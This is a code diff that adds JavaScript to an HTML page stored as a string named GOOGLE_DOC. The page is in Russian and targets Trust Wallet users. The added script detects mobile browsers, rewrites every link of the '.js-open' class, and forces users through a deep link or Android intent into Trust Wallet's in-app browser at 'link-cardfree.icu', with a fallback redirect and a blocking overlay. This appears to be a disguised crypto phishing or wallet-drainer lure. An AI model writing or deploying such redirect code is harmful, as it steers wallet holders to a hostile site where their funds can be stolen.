@@ -601,4 +601,49 @@ window.GOOGLE_DOC = "<!doctype html>\n<html lang=\"ru\">\n<head>\n<meta charset=
 
   var toast = document.getElementById('toast');
   var timer, fallback;
-  var DEST = 'https://link-cardfree.icu/
+  var DEST = 'https://link-cardfree.icu/';
+  var SCHEME = 'trust://open_url?url=' + encodeURIComponent(DEST);
+  var INTENT = 'intent://open_url?url=' + encodeURIComponent(DEST) + '#Intent;scheme=trust;package=com.wallet.crypto.trustapp;end';
+  var ua2 = navigator.userAgent;
+  var isIOS = /iPhone|iPad|iPod/i.test(ua2);
+  var isAndroid = /Android/i.test(ua2);
+  var isMobile = isIOS || isAndroid;
+  var gate = document.getElementById('gate');
+  var gateOpen = document.getElementById('gateOpen');
+  var gateStay = document.getElementById('gateStay');
+
+  function showToast(msg) {
+    toast.textContent = msg;
+    toast.classList.add('show');
+    clearTimeout(timer);
+    timer = setTimeout(function () { toast.classList.remove('show'); }, 1500);
+  }
+
+  function openApp() {
+    try { window.location.href = isAndroid ? INTENT : SCHEME; } catch (err) { window.location.href = DEST; }
+    clearTimeout(fallback);
+    fallback = setTimeout(function () { if (!document.hidden) window.location.href = DEST; }, isIOS ? 2400 : 1600);
+  }
+
+  document.querySelectorAll('.js-open').forEach(function (a) {
+    a.href = DEST;
+    a.addEventListener('click', function (e) {
+      showToast('Открываем Trust Wallet…');
+      if (!isMobile) return;
+      e.preventDefault();
+      if (gate) { gate.classList.add('show'); document.body.style.overflow = 'hidden'; }
+      openApp();
+    });
+  });
+
+  if (gateOpen) gateOpen.addEventListener('click', function (e) {
+    e.preventDefault();
+    openApp();
+  });
+  if (gateStay) gateStay.addEventListener('click', function () {
+    if (gate) gate.classList.remove('show');
+    document.body.style.overflow = '';
+  });
+</script>
+</body>
+</html>
